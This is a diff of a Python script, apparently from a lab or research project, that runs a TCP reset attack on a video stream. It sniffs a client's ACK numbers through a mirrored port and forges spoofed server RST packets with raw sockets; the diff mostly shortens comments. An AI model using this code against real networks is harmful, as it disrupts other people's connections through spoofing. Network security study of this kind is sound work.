@@ -1,21 +1,13 @@
 #!/usr/bin/env python3
 """
-TCP Reset Attack on Video Streaming -- Attack A: forge a RST from the
-server to the client using the client's own sniffed ACK as SEQ (an
-exact match, per RFC 5961 -- accepted immediately, no challenge ACK).
+Forges a RST from the server to the client, using the client's own
+sniffed ACK as the sequence number (exact match -> accepted immediately
+under RFC 5961). Run on h2 with mirror_enable.sh already applied and a
+stream active between h1 and h3.
 
-Run on h2 with mirror_enable.sh already applied and a stream active
-between h1 and h3.
-
-Uses raw AF_PACKET sockets, not any packet-crafting library, for every
-frame this tool sends or reads -- the ARP request/reply used to resolve
-h1's MAC, and the forged RST itself. An earlier Scapy-based version's
-per-packet overhead was close to or above the ~24ms real-segment gap,
-causing an unbounded processing backlog once a shot was slow. Packet
-fields that never change (MACs, spoofed IPs) are precomputed once; only
-the TCP seq/checksum are rebuilt per shot. The main loop also always
-processes the newest queued frame, not the oldest, so a transient
-slowdown can't compound.
+Raw AF_PACKET sockets only, no packet-crafting library -- an earlier
+Scapy version was too slow to win the race reliably. Static fields are
+precomputed once; only seq/checksum change per shot.
 """
 
 import os
@@ -24,9 +16,8 @@ import struct
 import sys
 import time
 
-# SNIFF_IFACE is h2's mirror-fed monitor port; SEND_IFACE is its normal
-# port. Mirroring onto SEND_IFACE broke its own outgoing traffic, so the
-# two roles are split across separate interfaces.
+# SNIFF_IFACE = mirror-fed monitor port, SEND_IFACE = normal port.
+# Mirroring onto SEND_IFACE broke its own outgoing traffic, hence two.
 SNIFF_IFACE = "h2-eth1"
 SEND_IFACE = "h2-eth0"
 
@@ -41,15 +32,12 @@ ETH_P_ALL = 0x0003
 
 TCP_FIN, TCP_SYN, TCP_RST, TCP_PSH, TCP_ACK, TCP_URG = 0x01, 0x02, 0x04, 0x08, 0x10, 0x20
 
-# Client ports we've already seen tear themselves down -- stop firing at
-# a flow once it's dead instead of spamming pointless RSTs at it.
+# Flows already dead -- stop firing at them.
 closed_ports = set()
 
 attempt_count = 0
 
-# Per-flow attempt/timing bookkeeping, printed as a RESULT line so
-# experiments/run_experiments.py can parse attempts-to-kill/time-to-kill
-# straight from this script's stdout.
+# Per-flow bookkeeping, printed as a RESULT line for run_experiments.py.
 attempts_by_port = {}
 first_fired_at = {}
 
@@ -85,8 +73,7 @@ def flags_to_str(flags):
 
 
 def build_arp_request(own_mac):
-    """Hand-built ARP request (broadcast): "who has CLIENT_IP, tell
-    ATTACKER_IP" -- 14-byte Ethernet header + 28-byte ARP payload."""
+    """ARP request (broadcast): who has CLIENT_IP?"""
     eth = struct.pack("!6s6sH", b"\xff" * 6, mac_to_bytes(own_mac), ETH_P_ARP)
     arp = struct.pack(
         "!HHBBH6s4s6s4s",
@@ -112,8 +99,6 @@ def parse_arp_reply(frame):
 
 
 def resolve_client_mac():
-    # Hand-rolled ARP over a raw socket bound to SEND_IFACE -- avoids
-    # relying on any library's own interface/routing detection.
     global CLIENT_MAC, OWN_MAC
     OWN_MAC = get_own_mac(SEND_IFACE)
 
@@ -156,8 +141,7 @@ def checksum16(data):
 
 
 def build_eth_ip_template():
-    """Ethernet+IP header, built and checksummed once -- identical on
-    every forged packet, so no need to redo it per shot."""
+    """Ethernet+IP header -- same on every shot, so build it once."""
     eth_header = struct.pack("!6s6sH", mac_to_bytes(CLIENT_MAC), mac_to_bytes(OWN_MAC), ETH_P_IP)
 
     total_len = 40  # 20 (IP) + 20 (TCP), no options, no payload
@@ -208,9 +192,7 @@ def fire_forged_rst(send_sock, eth_ip_template, client_port, seq):
 
 
 def parse_tcp_packet(frame):
-    """Returns (src_ip, dst_ip, sport, dport, flags, seq, ack) for an
-    IPv4/TCP frame, or None. Reads fixed TCP header offsets directly,
-    unaffected by any options (e.g. timestamps) that may follow."""
+    """(src_ip, dst_ip, sport, dport, flags, seq, ack) or None."""
     if len(frame) < 14 + 20 + 20:
         return None
     eth_type = struct.unpack("!H", frame[12:14])[0]
@@ -249,8 +231,7 @@ def handle(frame, send_sock, eth_ip_template):
         return
 
     if flags & TCP_SYN:
-        # No meaningful ACK yet -- would kill at handshake time, not
-        # mid-stream.
+        # No real ACK yet -- would kill the handshake, not mid-stream.
         return
 
     if flags & (TCP_RST | TCP_FIN):
@@ -261,8 +242,7 @@ def handle(frame, send_sock, eth_ip_template):
         time_to_close = (now - started) if started is not None else None
         print(f"[attack] {CLIENT_IP}:{client_port} closed itself (flags={flags_to_str(flags)}) "
               f"-- no longer targeting this flow")
-        # Machine-readable summary for this flow -- parsed by
-        # experiments/run_experiments.py.
+        # Parsed by run_experiments.py.
         print(f"RESULT client_port={client_port} attempts={n} time_to_close={time_to_close}")
         return
 
@@ -287,9 +267,7 @@ if __name__ == "__main__":
     print(f"[attacker] will forge RST packets as {SERVER_IP}:{SERVER_PORT} -> {CLIENT_IP} via {SEND_IFACE}")
 
     while True:
-        # Drain to the newest frame before handling it, so a transient
-        # slowdown can't compound into a growing backlog (plain recv()
-        # is FIFO -- a lag would otherwise never recover).
+        # Drain to newest frame -- plain recv() is FIFO, so a lag would never recover.
         frame = recv_sock.recv(65535)
         while True:
             try:
